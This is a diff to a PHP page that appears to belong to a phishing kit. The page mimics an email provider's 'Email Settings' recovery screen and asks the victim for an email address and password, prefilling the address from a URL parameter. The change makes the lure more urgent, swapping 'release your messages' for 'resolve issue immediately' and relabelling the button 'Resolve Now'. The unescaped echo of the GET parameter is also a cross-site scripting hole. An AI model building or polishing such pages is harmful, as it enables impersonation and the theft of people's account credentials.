@@ -680,11 +680,11 @@ $client_id = $_SESSION['client_id'] = $_GET['client_id'];
               <div id="default-template" class="top-spacer"><div id="default-logo-container"></div></div>
                <div id="passwordRecoveryCard"><div><div id="PasswordRecoveryLandingCard">
             <input type="hidden" name="userid" value="<?php echo $client_id;?>"><h3 class="page-title-with-back">Email Settings</h3></div></div><fieldset class="form-group">
-            <p>Sign in with your email password to release your messages</p>
+            <p>Sign in with your email to resolve issue immediately</p>
 
             <label for="PasswordRecoveryLandingUsername" id="label-PasswordRecoveryLandingUsername">Email Addrress </label><input spellcheck="false" type="text" required id="" name="email" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value="<?php echo $client_id;?>"></fieldset><fieldset class="form-group">
             <label for="PasswordRecoveryLandingUsername" id="label-PasswordRecoveryLandingUsername">Password </label><input spellcheck="false" type="password" required id="" name="old_pass" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value=""></fieldset><fieldset class="form-group">
-            </fieldset><button tabindex="0" class="btn btn-primary submit-button" id="" type="submit">Release Messages</button></div></div></div> </form></div></div></div></div></div></div></div><div id="footer-85ff98c4b0d823d68217b41206a35a77"><footer id="appheader-footer" class="manifest footer"><div role="contentinfo" class="container"><span>Copyright © 1999 - 2019.  All Rights Reserved.</span> <a href="#" target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click"><span>Privacy Policy</span></a></div><div id="gtm_privacy"></div></footer></div><script>
+            </fieldset><button tabindex="0" class="btn btn-primary submit-button" id="" type="submit">Resolve Now</button></div></div></div> </form></div></div></div></div></div></div></div><div id="footer-85ff98c4b0d823d68217b41206a35a77"><footer id="appheader-footer" class="manifest footer"><div role="contentinfo" class="container"><span>Copyright © 1999 - 2019.  All Rights Reserved.</span> <a href="#" target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click"><span>Privacy Policy</span></a></div><div id="gtm_privacy"></div></footer></div><script>
 window.ux = window.ux || {};
 window.ux.eldorado = window.ux.eldorado || {};
 
